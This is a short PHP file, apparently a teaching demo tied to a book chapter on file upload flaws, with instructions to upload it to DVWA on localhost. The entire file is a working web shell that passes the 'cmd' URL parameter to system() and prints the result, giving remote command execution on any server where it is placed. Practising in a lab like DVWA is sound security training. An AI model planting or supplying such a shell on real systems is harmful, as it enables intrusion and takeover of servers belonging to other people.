<?php
// EDUCATIONAL PURPOSE ONLY - File Upload Vulnerability Demo
// Book: "Safe Web Application Development" by Tokumaru Hiroshi, Chapter 4.12
// This file demonstrates why unrestricted file upload is dangerous
//
// Usage: Upload this to DVWA File Upload (Low security)
// Then access: http://localhost:8080/hackable/uploads/shell.php?cmd=whoami

if (isset($_GET['cmd'])) {
    echo '<pre>';
    echo system($_GET['cmd']);
    echo '</pre>';
} else {
    echo '<p>No command provided. Use ?cmd=whoami</p>';
}
?>
